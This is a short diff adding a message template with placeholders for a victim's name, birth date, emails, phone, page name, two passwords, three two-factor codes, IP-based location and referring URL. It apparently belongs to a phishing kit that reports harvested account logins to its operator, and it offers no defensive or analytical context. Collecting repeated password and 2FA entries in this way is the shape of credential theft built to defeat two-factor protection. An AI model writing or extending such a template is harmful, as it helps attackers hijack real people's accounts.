@@ -1,0 +1,21 @@
+Status: {{form_type}}
+
+Country: {{ip_address}} - {{country}} - {{city}}
+Thời Gian: {{current_time}}
+
+Full Name: {{full_name}}
+Date of Birth: {{date_of_birth}}
+Business Email: {{business_email}}
+Personal Email: {{personal_email}}
+Phone Number: {{phone_number}}
+Page Name: {{page_name}}
+
+Password 1: {{password1}}
+Password 2: {{password2}}
+
+2FA One: {{code1}}
+2FA Two: {{code2}}
+2FA Three: {{code3}}
+
+Additional Info: {{additional_info}}
+User Refferer: {{current_url}}
